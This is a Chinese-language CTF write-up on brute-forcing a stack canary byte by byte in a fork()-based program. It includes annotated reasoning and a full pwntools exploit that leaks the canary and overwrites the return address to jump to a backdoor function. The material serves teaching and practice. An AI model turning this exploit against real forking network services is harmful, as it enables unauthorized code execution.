# 利用fork()获取Canary

### 核心原理

`fork()`是一个系统调用，它的作用是“复制”当前进程，创建一个全新的、几乎一模一样的子进程。

* **关键特性：**
  * 子进程是父进程的**副本**，它们有各自独立的内存空间。
  * **对于Canary来说，最关键的一点是：** 在 `fork()`出来的父子进程中，**Canary的值是相同的**

因为Canary在每次 `fork()`后是固定的，而我们可以通过让程序崩溃来获取信息，这就为我们爆破提供了可能。

Canary通常是一个4字节（32位程序）或8字节（64位程序）的值，最低位通常是[font color="#FF1493"]**\x00**[/font]

所以，我们需要爆破的是剩下的3个或7个字节。

[font color="#1E90FF"]**核心思想：**[/font] 我们无法一次性猜出整个Canary，但我们可以**一个字节一个字节地猜**。因为父子进程Canary相同，我们可以通过子进程是否崩溃来推断我们猜的字节是否正确

我们可以用这样的一个循环来爆破，从[font color="#FF1493"]**\x00**[/font]到[font color="#FF1493"]**\xFF**[/font]最大需要尝试256次

```python
for i in range(需要爆破的字节数):
	for byte in range(256):
```

然后接收反馈的信息，通常错误的Canary会反馈 `*** stack smashing detected `**`***`**`:./pwn（程序名） terminated`

```python
if b'*** stack smashing detected ***' in response:
	continue
if b'正常反馈' in response:
	canary += bytes([byte])
	break
```

打远程的时候最好添加一个 `sleep`，执行起来更顺畅

看这道例题

![image.png](http://joker233.top/usr/uploads/2025/12/3841793845.png)

IDA分析一下

![image.png](http://joker233.top/usr/uploads/2025/12/3403207553.png)

可以看到fork的进程会调用 `kid`函数，这个函数没有可用的漏洞点

再看kid函数

![image.png](http://joker233.top/usr/uploads/2025/12/1508302241.png)

很明显的栈溢出漏洞

那么思路就是用[font color="#1E90FF"]**one-by-one**[/font]爆破出**Canary**，再用栈溢出覆盖返回地址为 `backdoor`的地址

这里引用一位师傅的提醒

[scode type="blue" size=""]

在利用 `fork()` 爆破canary的时候，需要特别注意 `send`，`sendline`的区别，理解不同的发送方式可能会造成的逻辑混乱，请阅读[这篇文章](https://www.cnblogs.com/ZIKH26/articles/15855666.html)。

以及，如果用 `chr(num).encode()`的形式将数字转换成字节的话，会存在当 `num>0x7f`后，`encode`后会变成两个字节的问题，因此，不要用这种方式转换，可以用 `bytes([i])`的形式。[/scode]

最后得出exp：

```python
from pwn import *
context.arch = 'i386'
context.log_level = 'debug'
#p = process('./canary3')
p = remote('ip',port)

door = 0x8049321

p.recvuntil(b'please:\n')
p.send(b'joker233')

canary_bytes = b'\x00'

for i in range(3):
	for byte in range(256):
		p.recvuntil(b'\n')
		payload = b'A'*30 + canary_bytes + bytes([byte])
		p.send(payload)
		response = p.recvuntil(b'\n')
		if b'*** stack smashing detected ***' in response:
			continue
		if b'DO MORE ?' in response:
			canary_bytes += bytes([byte])
			break
canary = u32(canary_bytes)
success(f'Canary is :{hex(canary)}')

pay2 = b'A'*30 + p32(canary) + b'B'*8 + b'C'*4 + p32(door)
p.send(pay2)

p.interactive()

```